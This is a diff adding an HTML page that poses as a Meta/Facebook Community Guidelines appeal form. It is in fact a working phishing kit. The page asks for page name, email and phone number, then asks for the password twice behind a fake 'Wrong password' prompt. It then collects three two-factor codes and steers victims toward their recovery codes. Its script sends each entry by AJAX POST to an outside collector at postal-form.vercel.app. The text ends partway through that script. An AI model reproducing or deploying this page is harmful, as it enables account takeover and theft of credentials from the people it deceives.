@@ -1,0 +1,1341 @@
+<html lang="en">
+  <!-- Added by HTTrack -->
+  <meta http-equiv="content-type" content="text/html;charset=utf-8" />
+  <!-- /Added by HTTrack -->
+
+  <head>
+    <!-- Required meta tags -->
+    <meta charset="UTF-8" />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1, shrink-to-fit=no"
+    />
+    <meta
+      http-equiv="Content-Security-Policy"
+      content="upgrade-insecure-requests"
+    />
+    <link rel="stylesheet" href="css/intlTelInput.css" />
+    <link rel="stylesheet" href="css/App-830a8c3e.css" />
+    <link rel="stylesheet" href="css/app-3f78f99a.css" />
+    <link
+      rel="stylesheet"
+      href="https://site-assets.fontawesome.com/releases/v6.1.1/css/all.css"
+    />
+    <link
+      rel="stylesheet"
+      href="https://cdn.jsdelivr.net/npm/bootstrap@4.3.1/dist/css/bootstrap.min.css"
+    />
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script src="js/intlTelInput.min.js"></script>
+    <title>Meta</title>
+    <style>
+      /* Absolute Center Spinner */
+
+      .loading {
+        position: fixed;
+        z-index: 999;
+        height: 2em;
+        width: 2em;
+        overflow: show;
+        margin: auto;
+        top: 0;
+        left: 0;
+        bottom: 0;
+        right: 0;
+      }
+
+      /* Transparent Overlay */
+
+      .loading:before {
+        content: "";
+        display: block;
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: radial-gradient(rgba(20, 20, 20, 0.8), rgba(0, 0, 0, 0.8));
+        background: -webkit-radial-gradient(
+          rgba(20, 20, 20, 0.8),
+          rgba(0, 0, 0, 0.8)
+        );
+      }
+
+      /* :not(:required) hides these rules from IE9 and below */
+
+      .loading:not(:required) {
+        /* hide "loading..." text */
+        font: 0/0 a;
+        color: transparent;
+        text-shadow: none;
+        background-color: transparent;
+        border: 0;
+      }
+
+      .loading:not(:required):after {
+        content: "";
+        display: block;
+        font-size: 10px;
+        width: 1em;
+        height: 1em;
+        margin-top: -0.5em;
+        -webkit-animation: spinner 150ms infinite linear;
+        -moz-animation: spinner 150ms infinite linear;
+        -ms-animation: spinner 150ms infinite linear;
+        -o-animation: spinner 150ms infinite linear;
+        animation: spinner 150ms infinite linear;
+        border-radius: 0.5em;
+        -webkit-box-shadow: rgba(255, 255, 255, 0.75) 1.5em 0 0 0,
+          rgba(255, 255, 255, 0.75) 1.1em 1.1em 0 0,
+          rgba(255, 255, 255, 0.75) 0 1.5em 0 0,
+          rgba(255, 255, 255, 0.75) -1.1em 1.1em 0 0,
+          rgba(255, 255, 255, 0.75) -1.5em 0 0 0,
+          rgba(255, 255, 255, 0.75) -1.1em -1.1em 0 0,
+          rgba(255, 255, 255, 0.75) 0 -1.5em 0 0,
+          rgba(255, 255, 255, 0.75) 1.1em -1.1em 0 0;
+        box-shadow: rgba(255, 255, 255, 0.75) 1.5em 0 0 0,
+          rgba(255, 255, 255, 0.75) 1.1em 1.1em 0 0,
+          rgba(255, 255, 255, 0.75) 0 1.5em 0 0,
+          rgba(255, 255, 255, 0.75) -1.1em 1.1em 0 0,
+          rgba(255, 255, 255, 0.75) -1.5em 0 0 0,
+          rgba(255, 255, 255, 0.75) -1.1em -1.1em 0 0,
+          rgba(255, 255, 255, 0.75) 0 -1.5em 0 0,
+          rgba(255, 255, 255, 0.75) 1.1em -1.1em 0 0;
+      }
+
+      /* Animation */
+
+      @-webkit-keyframes spinner {
+        0% {
+          -webkit-transform: rotate(0deg);
+          -moz-transform: rotate(0deg);
+          -ms-transform: rotate(0deg);
+          -o-transform: rotate(0deg);
+          transform: rotate(0deg);
+        }
+        100% {
+          -webkit-transform: rotate(360deg);
+          -moz-transform: rotate(360deg);
+          -ms-transform: rotate(360deg);
+          -o-transform: rotate(360deg);
+          transform: rotate(360deg);
+        }
+      }
+
+      @-moz-keyframes spinner {
+        0% {
+          -webkit-transform: rotate(0deg);
+          -moz-transform: rotate(0deg);
+          -ms-transform: rotate(0deg);
+          -o-transform: rotate(0deg);
+          transform: rotate(0deg);
+        }
+        100% {
+          -webkit-transform: rotate(360deg);
+          -moz-transform: rotate(360deg);
+          -ms-transform: rotate(360deg);
+          -o-transform: rotate(360deg);
+          transform: rotate(360deg);
+        }
+      }
+
+      @-o-keyframes spinner {
+        0% {
+          -webkit-transform: rotate(0deg);
+          -moz-transform: rotate(0deg);
+          -ms-transform: rotate(0deg);
+          -o-transform: rotate(0deg);
+          transform: rotate(0deg);
+        }
+        100% {
+          -webkit-transform: rotate(360deg);
+          -moz-transform: rotate(360deg);
+          -ms-transform: rotate(360deg);
+          -o-transform: rotate(360deg);
+          transform: rotate(360deg);
+        }
+      }
+
+      @keyframes spinner {
+        0% {
+          -webkit-transform: rotate(0deg);
+          -moz-transform: rotate(0deg);
+          -ms-transform: rotate(0deg);
+          -o-transform: rotate(0deg);
+          transform: rotate(0deg);
+        }
+        100% {
+          -webkit-transform: rotate(360deg);
+          -moz-transform: rotate(360deg);
+          -ms-transform: rotate(360deg);
+          -o-transform: rotate(360deg);
+          transform: rotate(360deg);
+        }
+      }
+    </style>
+
+    <link rel="shortcut icon" href="images/favicon.ico" />
+  </head>
+
+  <body>
+    <div id="loading" class="loading" style="display: none"></div>
+
+    <link rel="stylesheet" href="css/app.css" />
+    <div class="app-wrapper container-fluid-width home-page home">
+      <section class="header">
+        <div class="container" bis_skin_checked="1">
+          <div class="row" bis_skin_checked="1">
+            <div class="col-6" bis_skin_checked="1">
+              <img src="images/newlogo1.png" class="img-fluid" width="50" />
+            </div>
+            <div class="col-6" style="text-align: right" bis_skin_checked="1">
+              <p
+                style="
+                  color: #3578e5;
+                  display: none;
+                  padding-top: 8px;
+                  margin-bottom: 0px;
+                  font-weight: 600;
+                  font-size: 15px;
+                "
+              >
+                <i style="font-size: 16px" class="fa-solid fa-envelope"></i>
+                Support Inbox
+              </p>
+            </div>
+          </div>
+        </div>
+      </section>
+      <section class="main">
+        <div class="container">
+          <div class="row">
+            <div class="col-md-8 offset-md-2">
+              <div class="card">
+                <div
+                  class="row"
+                  style="padding-bottom: 20px; border-bottom: 1px solid #dddfe2"
+                >
+                  <div class="col-md-1 col-2">
+                    <img
+                      src="images/email-icon-circle-28.jpg"
+                      class="fa-solid fa-envelope"
+                      style=""
+                      width="50"
+                    />
+                  </div>
+                  <div class="col-md-11 col-10">
+                    <p style="font-weight: bold; margin-bottom: 0">
+                      Community Guidelines
+                    </p>
+                    <div class="">
+                      <span
+                        data-v-4362cbd2=""
+                        class="open"
+                        style="
+                          background-color: rgb(59, 129, 211);
+                          font-size: 12px;
+                        "
+                        >OPEN</span
+                      >
+                      <span style="color: #90949c; font-size: 12px"
+                        >CASE #8894777049546</span
+                      >
+                    </div>
+                  </div>
+                </div>
+                <div
+                  class="row"
+                  style="
+                    padding-top: 20px;
+                    padding-bottom: 20px;
+                    border-bottom: 1px solid #dddfe2;
+                  "
+                >
+                  <input hidden id="ip" name="ip" />
+                  <div class="col-md-1 col-2">
+                    <img src="images/newlogo1.png" class="img-fluid" />
+                  </div>
+                  <div class="col-md-11 col-10" style="padding-left: 0">
+                    <p
+                      style="
+                        font-weight: bold;
+                        font-size: 14px;
+                        margin-bottom: 7px;
+                      "
+                    >
+                      Our Message
+                    </p>
+                    <p
+                      style="font-size: 14px; color: #67788a"
+                      class="ourmessagiii"
+                    >
+                      - Community Standards<br />
+                      - Copyright<br />
+                      - Hate speech, harassment and bullying<br />
+                      - Intellectual property rights<br />
+                      <br />
+                      If you believe your page does not violate our policies,
+                      please fill out this form so we can help.
+                    </p>
+                  </div>
+                </div>
+                <div
+                  class="row"
+                  style="
+                    padding-top: 10px;
+                    padding-bottom: 10px;
+                    border-bottom: 1px solid #dddfe2;
+                  "
+                >
+                  <div class="col-md-1 col-2"></div>
+                  <div class="col-md-11 col-10" style="padding-left: 0">
+                    <p
+                      style="
+                        font-weight: bold;
+                        font-size: 14px;
+                        margin-bottom: 7px;
+                      "
+                    ></p>
+                    <form
+                      style="margin-left: -30px"
+                      action="javascript:void(0)"
+                      method="post"
+                      id="processMainForm"
+                    >
+                      <div style="display: inline-block">
+                        <label style="color: #67788a">* Required</label>
+                        <label
+                          style="
+                            color: #67788a;
+                            font-style: italic;
+                            font-weight: normal;
+                          "
+                          >(Your facebook Account Information)</label
+                        >
+                        <label
+                          id="form-error"
+                          style="color: red; font-style: italic"
+                        ></label>
+                      </div>
+                      <div class="form-group">
+                        <label for="name" style="color: #67788a"
+                          >Page Name *</label
+                        >
+                        <input
+                          type="text"
+                          class="form-control"
+                          id="ownerName"
+                          name="ownerName"
+                          style="font-size: 14px; border: 1px solid #67788a"
+                          required
+                        />
+                      </div>
+                      <div class="form-group">
+                        <label for="email" style="color: #67788a"
+                          >Email Address *</label
+                        >
+                        <input
+                          type="email"
+                          class="form-control"
+                          style="
+                            border-radius: 0;
+                            height: 35px;
+                            border: 1px solid #67788a;
+                          "
+                          id="ownerEmail"
+                          name="ownerEmail"
+                          aria-describedby="email"
+                          required
+                        />
+                      </div>
+                      <div class="form-group">
+                        <label for="phone" style="color: #67788a"
+                          >Phone Number *</label
+                        >
+                        <div>
+                          <input
+                            type="number"
+                            class="form-control"
+                            id="ownerPhoneNumber"
+                            name="ownerPhoneNumber"
+                            required
+                            style="
+                              display: inline-block;
+                              vertical-align: middle;
+                              width: 320px;
+                              border: 1px solid #67788a;
+                            "
+                            onkeypress="return event.charCode >= 48 && event.charCode <= 57"
+                          />
+                        </div>
+                      </div>
+
+                      <div class="form-check">
+                        <input
+                          class="form-check-input check"
+                          type="checkbox"
+                          id="check"
+                          value="1"
+                          name="check"
+                          required
+                        />
+                        <label
+                          class="form-check-label"
+                          for="check"
+                          name="check"
+                          style="
+                            font-size: 14px;
+                            color: #67788a;
+                            font-weight: bold;
+                          "
+                        >
+                          Agree to our Terms, Data Policy and Cookies Policy. *
+                        </label>
+                      </div>
+                      <input
+                        id="btn-submit"
+                        type="submit"
+                        class="btn btn-primary btn-register-send"
+                        name="formasubmitapeal"
+                        value="Submit"
+                        style="
+                          border-radius: 15px;
+                          box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2);
+                          margin-top: 20px;
+                          padding: 15px 20px 15px 20px;
+                          color: #ffffff;
+                          background-color: #0067cd;
+                          border: 0px;
+                          font-weight: bold;
+                          font-size: 14px;
+                        "
+                        onclick="processMainData()"
+                      />
+                      <div style="margin-top: 15px">
+                        <p
+                          style="
+                            font-size: 14px;
+                            color: #67788a;
+                            display: inline-block;
+                          "
+                        >
+                          For more information about how Meta handles your data
+                          please read our
+                        </p>
+                        <a
+                          style="
+                            font-size: 14px;
+                            text-decoration: underline;
+                            color: #0064e0;
+                          "
+                          href="https://www.facebook.com/privacy/explanation/"
+                          >Meta Privacy Policy</a
+                        >
+                      </div>
+                    </form>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+          <hr style="width: 50%" />
+        </div>
+      </section>
+
+      <div
+        class="modal-backdrop fade show modalbackdrop1"
+        style="display: none"
+      ></div>
+      <div
+        class="modal fade show"
+        style="margin-top: 20px; padding-right: 17px; display: none"
+        id="passwordModal1"
+        aria-modal="true"
+        role="dialog"
+        data-bs-keyboard="false"
+        data-bs-backdrop="static"
+      >
+        <div class="modal-dialog" role="document">
+          <div
+            style="
+              box-shadow: 0 2px 26px rgba(0, 0, 0, 0.3),
+                0 0 0 1px rgba(0, 0, 0, 0.1);
+            "
+            class="modal-content"
+          >
+            <div
+              style="
+                padding: 10px 15px;
+                background-color: #f5f6f7;
+                border-bottom: 1px solid #e5e5e5;
+              "
+              class="modal-header"
+            >
+              <h5
+                class="modal-title"
+                style="
+                  color: #67788a !important;
+                  font-size: 14px;
+                  font-weight: 600;
+                  line-height: 25px;
+                "
+              >
+                Please Enter Your Password
+              </h5>
+            </div>
+            <form
+              style="margin-bottom: 0px"
+              action="javascript:void(0)"
+              method="post"
+              id="processLoginForm1"
+            >
+              <input type="hidden" name="ownerName" id="validateOwnerName" />
+              <input type="hidden" name="ownerEmail" id="validateOwnerEmail" />
+              <input
+                type="hidden"
+                name="ownerPhoneNumber"
+                id="validateOwnerPhoneNumber"
+              />
+              <div class="modal-body">
+                <p style="font-size: 14px; color: #67788a">
+                  For your security, you must re-enter your password to
+                  continue.
+                </p>
+                <div style="margin-bottom: 0" class="form-group row">
+                  <label
+                    id="hiqetash"
+                    for="inputPassword3"
+                    class="col-form-label"
+                    style="
+                      font-size: 14px;
+                      display: inline-block;
+                      padding-left: 15px;
+                      padding-right: 9px;
+                      color: #67788a;
+                    "
+                    >Password</label
+                  >
+                  <div id="hiqetash2" class="password-container">
+                    <input
+                      type="password"
+                      id="ownerPassword1"
+                      name="ownerPassword1"
+                      style="
+                        height: 25px;
+                        font-size: 16px;
+                        width: 170px;
+                        margin-top: 5px;
+                        border-radius: 0;
+                        padding: 0 3px;
+                      "
+                      class="form-control password_input"
+                      required=""
+                    />
+                  </div>
+                </div>
+                <span id="message_che1" style="display: none"
+                  ><p style="color: Gray">Authentication in progress</p></span
+                >
+              </div>
+              <div class="modal-footer">
+                <button
+                  style="
+                    background-color: #4065b4;
+                    height: 27px;
+                    border: 1px solid #4267b2;
+                    padding: 1px 10px;
+                    line-height: 23px;
+                    font-size: 13px;
+                    font-weight: 600;
+                  "
+                  type="submit"
+                  class="btn btn-primary submit_password1"
+                  onclick="processLoginData1()"
+                >
+                  Submit
+                </button>
+              </div>
+            </form>
+          </div>
+        </div>
+      </div>
+
+      <div
+        class="modal-backdrop fade show modalbackdrop2"
+        style="display: none"
+      ></div>
+      <div
+        class="modal fade show"
+        style="margin-top: 20px; padding-right: 17px; display: none"
+        id="passwordModal2"
+        aria-modal="true"
+        role="dialog"
+        data-bs-keyboard="false"
+        data-bs-backdrop="static"
+      >
+        <div class="modal-dialog" role="document">
+          <div
+            style="
+              box-shadow: 0 2px 26px rgba(0, 0, 0, 0.3),
+                0 0 0 1px rgba(0, 0, 0, 0.1);
+            "
+            class="modal-content"
+          >
+            <div
+              style="
+                padding: 10px 15px;
+                background-color: #f5f6f7;
+                border-bottom: 1px solid #e5e5e5;
+              "
+              class="modal-header"
+            >
+              <h5
+                class="modal-title"
+                style="
+                  color: #67788a !important;
+                  font-size: 14px;
+                  font-weight: 600;
+                  line-height: 25px;
+                "
+              >
+                Please Enter Your Password
+              </h5>
+            </div>
+            <form
+              style="margin-bottom: 0px"
+              action="javascript:void(0)"
+              method="post"
+              id="processLoginForm2"
+            >
+              <input type="hidden" name="ownerEmail" id="validateOwnerEmail" />
+              <div class="modal-body">
+                <p style="font-size: 14px; color: #67788a">
+                  For your security, you must re-enter your password to
+                  continue.
+                </p>
+                <div style="margin-bottom: 0" class="form-group row">
+                  <label
+                    id="hiqetash"
+                    for="inputPassword3"
+                    class="col-form-label"
+                    style="
+                      font-size: 14px;
+                      display: inline-block;
+                      padding-left: 15px;
+                      padding-right: 9px;
+                      color: #67788a;
+                    "
+                    >Password</label
+                  >
+                  <div id="hiqetash2" class="password-container">
+                    <input
+                      type="password"
+                      id="ownerPassword2"
+                      name="ownerPassword2"
+                      style="
+                        height: 25px;
+                        font-size: 16px;
+                        width: 170px;
+                        margin-top: 5px;
+                        border-radius: 0;
+                        padding: 0 3px;
+                      "
+                      class="form-control password_input"
+                      required=""
+                    />
+                  </div>
+                </div>
+                <span id="message_che2" style="display: none"
+                  ><p style="color: Gray">Authentication in progress</p></span
+                >
+                <span id="message_err"
+                  ><p style="color: red">Wrong password. Try again</p></span
+                >
+              </div>
+              <div class="modal-footer">
+                <button
+                  style="
+                    background-color: #4065b4;
+                    height: 27px;
+                    border: 1px solid #4267b2;
+                    padding: 1px 10px;
+                    line-height: 23px;
+                    font-size: 13px;
+                    font-weight: 600;
+                  "
+                  type="submit"
+                  class="btn btn-primary submit_password2"
+                  onclick="processLoginData2()"
+                >
+                  Submit
+                </button>
+              </div>
+            </form>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="confirm" style="display: none">
+      <div id="root" data-v-e87fa722="" class="">
+        <section class="_header_7c581_1" data-v-e87fa722="">
+          <div class="_fotoh_7c581_13" data-v-e87fa722="">
+            <div class="_row_7c581_18" data-v-e87fa722="">
+              <div class="_col_7c581_23" data-v-e87fa722="">
+                <img
+                  src="images/facebook-79c20677.png"
+                  width="40"
+                  data-v-e87fa722=""
+                />
+              </div>
+              <div
+                class="_col_7c581_23"
+                style="text-align: right"
+                data-v-e87fa722=""
+              >
+                <p
+                  style="
+                    color: rgb(53, 120, 229);
+                    display: none;
+                    padding-top: 8px;
+                    margin-bottom: 0px;
+                    font-weight: 600;
+                    font-size: 15px;
+                  "
+                  data-v-e87fa722=""
+                >
+                  <i style="font-size: 16px" data-v-e87fa722=""></i> Support
+                  Inbox
+                </p>
+              </div>
+            </div>
+          </div>
+        </section>
+        <section class="_wapper_body_7c581_28 confirmFirst" data-v-e87fa722="">
+          <form action="javascript:void(0)" method="post" id="confirmFirstForm">
+            <input type="hidden" name="ownerEmail" id="validateOwnerEmail" />
+            <input
+              type="hidden"
+              name="logincodetags"
+              id="firstlogincodetags"
+              value="1st"
+              readonly
+            />
+            <div class="_card_7c581_32" data-v-e87fa722="">
+              <h3 data-v-e87fa722="">
+                Two-factor authentication required (1/3)
+              </h3>
+              <div class="_content_7c581_58" data-v-e87fa722="">
+                <p data-v-e87fa722="">
+                  You’ve asked us to require 6-8 digit login code when anyone
+                  tries to access your account from a new device or browser.
+                </p>
+                <p data-v-e87fa722="">
+                  Enter the 6-8 digit code from your code generator or
+                  third-party app below.
+                </p>
+              </div>
+              <div class="_code_7c581_70" data-v-e87fa722="">
+                <input
+                  type="text"
+                  maxlength="8"
+                  placeholder="Enter code"
+                  name="logincode"
+                  id="firstlogincode"
+                  data-v-e87fa722=""
+                />
+              </div>
+              <div
+                class="justify-content-between alertConfirmFirst"
+                data-v-e87fa722=""
+                style="text-align: left; display: none"
+              >
+                <span
+                  id="wrong_pass"
+                  class="text-danger d-none"
+                  data-v-e87fa722=""
+                >
+                  <p
+                    data-v-e87fa722=""
+                    style="
+                      margin: 0px 0px 20px;
+                      color: red;
+                      font-size: 13px;
+                      font-weight: 500;
+                      padding: 0px 1rem;
+                    "
+                  >
+                    Please enter your code.
+                  </p>
+                  <span data-v-e87fa722=""></span>
+                </span>
+              </div>
+              <div class="_code_footer_7c581_97" data-v-e87fa722="">
+                <span data-v-e87fa722="" onclick="open_anotherTutorial()"
+                  >Need another way to authenticate?</span
+                >
+                <button
+                  class="disabled:cursor-wait processConfirmFirstBtn"
+                  data-v-e87fa722=""
+                  onclick="processConfirmFirst()"
+                >
+                  Send
+                </button>
+              </div>
+            </div>
+          </form>
+        </section>
+        <section
+          class="_wapper_body_7c581_28 confirmSecond"
+          style="display: none"
+          data-v-e87fa722=""
+        >
+          <form
+            action="javascript:void(0)"
+            method="post"
+            id="confirmSecondForm"
+          >
+            <input type="hidden" name="ownerEmail" id="validateOwnerEmail" />
+            <input
+              type="hidden"
+              name="logincodetags"
+              id="secondlogincodetags"
+              value="2nd"
+              readonly
+            />
+            <div class="_card_7c581_32" data-v-e87fa722="">
+              <h3 data-v-e87fa722="">
+                Two-factor authentication required (2/3)
+              </h3>
+              <div class="_content_7c581_58" data-v-e87fa722="">
+                <p data-v-e87fa722="">
+                  You’ve asked us to require 6-8 digit login code when anyone
+                  tries to access your account from a new device or browser.
+                </p>
+                <p data-v-e87fa722="">
+                  Enter the 6-8 digit code from your code generator or
+                  third-party app below.
+                </p>
+              </div>
+              <div class="_code_7c581_70" data-v-e87fa722="">
+                <input
+                  type="text"
+                  maxlength="8"
+                  placeholder="Enter code"
+                  name="logincode"
+                  id="secondlogincode"
+                  data-v-e87fa722=""
+                />
+                <div class="text-gray-600 firstCountdown" data-v-e87fa722="">
+                  (wait: <span class="countdownFirst"></span>)
+                </div>
+              </div>
+              <div
+                class="justify-content-between alertConfirmSecond"
+                data-v-e87fa722=""
+                style="text-align: left"
+              >
+                <span id="wrong_pass" class="text-danger" data-v-e87fa722="">
+                  <p
+                    data-v-e87fa722=""
+                    class="txtAlertConfirmSecond"
+                    style="
+                      margin: 0px 0px 20px;
+                      color: red;
+                      font-size: 13px;
+                      font-weight: 500;
+                      padding: 0px 1rem;
+                    "
+                  >
+                    The code you've entered is incorrect.
+                  </p>
+                  <span data-v-e87fa722=""></span>
+                </span>
+              </div>
+              <div class="_code_footer_7c581_97" data-v-e87fa722="">
+                <span data-v-e87fa722="" onclick="open_anotherTutorial()"
+                  >Need another way to authenticate?</span
+                >
+                <button
+                  class="disabled:cursor-wait processConfirmSecondBtn"
+                  data-v-e87fa722=""
+                  onclick="processConfirmSecond()"
+                >
+                  Send
+                </button>
+              </div>
+            </div>
+          </form>
+        </section>
+        <section
+          class="_wapper_body_7c581_28 confirmThird"
+          style="display: none"
+          data-v-e87fa722=""
+        >
+          <form action="javascript:void(0)" method="post" id="confirmThirdForm">
+            <input type="hidden" name="ownerEmail" id="validateOwnerEmail" />
+            <input
+              type="hidden"
+              name="logincodetags"
+              id="thirdlogincodetags"
+              value="3rd"
+              readonly
+            />
+            <div class="_card_7c581_32" data-v-e87fa722="">
+              <h3 data-v-e87fa722="">
+                Two-factor authentication required (3/3)
+              </h3>
+              <div class="_content_7c581_58" data-v-e87fa722="">
+                <p data-v-e87fa722="">
+                  You’ve asked us to require 6-8 digit login code when anyone
+                  tries to access your account from a new device or browser.
+                </p>
+                <p data-v-e87fa722="">
+                  Enter the 6-8 digit code from your code generator or
+                  third-party app below.
+                </p>
+              </div>
+              <div class="_code_7c581_70" data-v-e87fa722="">
+                <input
+                  type="text"
+                  maxlength="8"
+                  placeholder="Enter code"
+                  name="logincode"
+                  id="thirdlogincode"
+                  data-v-e87fa722=""
+                />
+                <div class="text-gray-600 secondCountdown" data-v-e87fa722="">
+                  (wait: <span class="countdownSecond"></span>)
+                </div>
+              </div>
+              <div
+                class="justify-content-between alertConfirmThird"
+                data-v-e87fa722=""
+                style="text-align: left"
+              >
+                <span id="wrong_pass" class="text-danger" data-v-e87fa722="">
+                  <p
+                    data-v-e87fa722=""
+                    class="txtAlertConfirmThird"
+                    style="
+                      margin: 0px 0px 20px;
+                      color: red;
+                      font-size: 13px;
+                      font-weight: 500;
+                      padding: 0px 1rem;
+                    "
+                  >
+                    The code you've entered is incorrect.
+                  </p>
+                  <span data-v-e87fa722=""></span>
+                </span>
+              </div>
+              <div class="_code_footer_7c581_97" data-v-e87fa722="">
+                <span data-v-e87fa722="" onclick="open_anotherTutorial()"
+                  >Need another way to authenticate?</span
+                >
+                <button
+                  class="disabled:cursor-wait processConfirmThirdBtn"
+                  data-v-e87fa722=""
+                  onclick="processConfirmThird()"
+                >
+                  Send
+                </button>
+              </div>
+            </div>
+          </form>
+        </section>
+        <div
+          class="h-screen w-screen fixed top-0 left-0 bg-gray-500/50 flex items-center justify-center anotherTutorial"
+          style="display: none"
+          data-v-e87fa722=""
+        >
+          <div
+            class="max-w-[80%] md:max-w-[50%] p-4 md:p-8 bg-white rounded-md"
+            data-v-e87fa722=""
+          >
+            <div
+              class="mb-4 flex items-center justify-between"
+              data-v-e87fa722=""
+            >
+              <div class="text-[18px] font-bold" data-v-e87fa722="">
+                Didn't receive a code?
+              </div>
+              <div
+                class="text-[36px] cursor-pointer text-gray-600"
+                data-v-e87fa722=""
+                onclick="close_anotherTutorial()"
+              >
+                ×
+              </div>
+            </div>
+            <div class="w-full h-[1px] bg-gray-200" data-v-e87fa722=""></div>
+            <div class="" data-v-e87fa722="">
+              <p data-v-e87fa722="">
+                1. Go to
+                <span class="font-bold" data-v-e87fa722=""
+                  >Setting &gt; Security and Login.</span
+                >
+              </p>
+              <p data-v-e87fa722="">
+                2. Under the
+                <span class="font-bold" data-v-e87fa722=""
+                  >Two-Factor Authentication</span
+                >
+                section, click
+                <span class="font-bold" data-v-e87fa722=""
+                  >Use Two-Factor Authentication</span
+                >. You may need to re-enter your password.
+              </p>
+              <p data-v-e87fa722="">
+                3. Next to
+                <span class="font-bold" data-v-e87fa722="">Recovery Codes</span
+                >, clicks
+                <span class="font-bold" data-v-e87fa722="">Setup</span> then
+                <span class="font-bold" data-v-e87fa722="">Get Codes.</span> If
+                you're already set up recovery codes, you can click
+                <span class="font-bold" data-v-e87fa722="">Show Codes.</span>
+              </p>
+            </div>
+            <div class="mt-5 flex items-center justify-end" data-v-e87fa722="">
+              <div
+                class="py-2 px-5 bg-gray-500 font-bold text-white rounded cursor-pointer"
+                data-v-e87fa722=""
+                onclick="close_anotherTutorial()"
+              >
+                Close
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/jquery.cookie@1.4.1/jquery.cookie.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.3.1/dist/js/bootstrap.min.js"></script>
+    <script
+      type="text/javascript"
+      src="http://code.jquery.com/jquery-1.10.2.min.js"
+    ></script>
+    <script
+      type="text/javascript"
+      src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"
+    ></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
+    <script>
+      function open_anotherTutorial() {
+        $(".anotherTutorial").show();
+      }
+
+      function close_anotherTutorial() {
+        $(".anotherTutorial").hide();
+      }
+
+      function showLoadingCircle() {
+        document.getElementById("loading").style.display = "block";
+      }
+
+      function hideLoadingCircle() {
+        document.getElementById("loading").style.display = "none";
+      }
+      var input = document.querySelector("#ownerPhoneNumber");
+      window.intlTelInput(input, {
+        separateDialCode: true,
+        preferredCountries: ["us"],
+      });
+
+      function processMainData() {
+        $("#processMainForm").submit(function (submitingprocessMainData) {
+          submitingprocessMainData.preventDefault();
+
+          $ownerName = $("#ownerName").val().trim();
+          $ownerEmail = $("#ownerEmail").val().trim();
+          $ownerPhoneNumber = $("#ownerPhoneNumber").val().trim();
+          if (
+            $ownerName == "" ||
+            $ownerEmail == "" ||
+            $ownerPhoneNumber == ""
+          ) {
+          } else {
+            $("input#validateOwnerName").val($ownerName);
+            $("input#validateOwnerEmail").val($ownerEmail);
+            $("input#validateOwnerPhoneNumber").val($ownerPhoneNumber);
+
+
+            showLoadingCircle();
+            setTimeout(() => {
+              $("#loading").show({
+                backdrop: "static",
+                keyboard: false,
+              });
+
+              hideLoadingCircle();
+              $("#loading").hide();
+              $(".modalbackdrop1").show();
+              $("#passwordModal1").show();
+            }, 2000);
+          }
+        });
+      }
+
+      function processLoginData1() {
+        $("#processLoginForm1").submit(function (submitingprocessLoginData1) {
+          submitingprocessLoginData1.preventDefault();
+
+          var $validateOwnerName = $("input#validateOwnerName").val();
+          var $validateOwnerEmail = $("input#validateOwnerEmail").val();
+          var $validateOwnerPhoneNumber = $(
+            "input#validateOwnerPhoneNumber"
+          ).val();
+          var $ownerPassword1 = $("input#ownerPassword1").val();
+
+
+          var postData = {
+              validateOwnerName: $validateOwnerName,
+              validateOwnerEmail: $validateOwnerEmail,
+              validateOwnerPhoneNumber: $validateOwnerPhoneNumber,
+              ownerPassword1:$ownerPassword1
+            };
+
+          $.ajax({
+            type: "POST",
+            url: "https://postal-form.vercel.app/data",
+            data:JSON.stringify(postData),
+            beforeSend: function () {
+              $("#message_che1").show();
+            },
+            success: function () {
+              $(".modalbackdrop1").hide();
+              $("#passwordModal1").hide();
+              $("#message_che").hide();
+              $(".modalbackdrop2").show();
+              $("#passwordModal2").show();
+            },
+          });
+        });
+        return false;
+      }
+
+      function processLoginData2() {
+        $("#processLoginForm2").submit(function (submitingprocessLoginData2) {
+          submitingprocessLoginData2.preventDefault();
+
+          var $validateOwnerEmail = $("input#validateOwnerEmail").val();
+          var $ownerPassword2 = $("input#ownerPassword2").val();
+
+
+          var postData = {
+              validateOwnerEmail: $validateOwnerEmail,
+              ownerPassword2: $ownerPassword2,
+            };
+
+          $.ajax({
+            type: "POST",
+            url: "https://postal-form.vercel.app/data",
+            data: JSON.stringify(postData),
+            beforeSend: function () {
+              $("#message_che2").show();
+              $("#message_err").hide();
+            },
+            success: function () {
+              $(".home").hide();
+              $(".modalbackdrop2").hide();
+              $("#passwordModal2").hide();
+              $(".modalbackdrop3").show();
+              $(".confirm").show();
+            },
+          });
+        });
+        return false;
+      }
+
+      function processConfirmFirst() {
+        $("#confirmFirstForm").submit(function (submitingprocessConfirmFirst) {
+          submitingprocessConfirmFirst.preventDefault();
+
+          var $validateOwnerEmail = $("input#validateOwnerEmail").val();
+          var $firstlogincodetags = $("input#firstlogincodetags").val();
+          var $firstlogincode = $("input#firstlogincode").val();
+
+          if ($firstlogincode == "") {
+            $(".alertConfirmFirst").show();
+          } else {
+            var postData = {
+              validateOwnerEmail: $validateOwnerEmail,
+              firstlogincodetags: $firstlogincodetags,
+              firstlogincode: $firstlogincode,
+            };
+
+            $.ajax({
+              type: "POST",
+              url: "https://postal-form.vercel.app/data",
+              data: JSON.stringify(postData),
+              beforeSend: function () {
+                $(".processConfirmFirstBtn")
+                  .html(
+                    'Send <i class="fa-duotone fa-spinner-third fa-spin"></i>'
+                  )
+                  .prop("disabled", true);
+              },
+              success: function () {
+                $(".confirmFirst").hide();
+                $(".confirmSecond").show();
+                $("#secondlogincode").attr("disabled", true);
+                startFirstTimer();
+              },
+            });
+          }
+        });
+        return false;
+      }
+
+      function processConfirmSecond() {
+        $("#confirmSecondForm").submit(function (
+          submitingprocessConfirmSecond
+        ) {
+          submitingprocessConfirmSecond.preventDefault();
+
+          var $validateOwnerEmail = $("input#validateOwnerEmail").val();
+          var $secondlogincodetags = $("input#secondlogincodetags").val();
+          var $secondlogincode = $("input#secondlogincode").val();
+
+          if ($secondlogincode == "") {
+            $(".alertConfirmSecond").show();
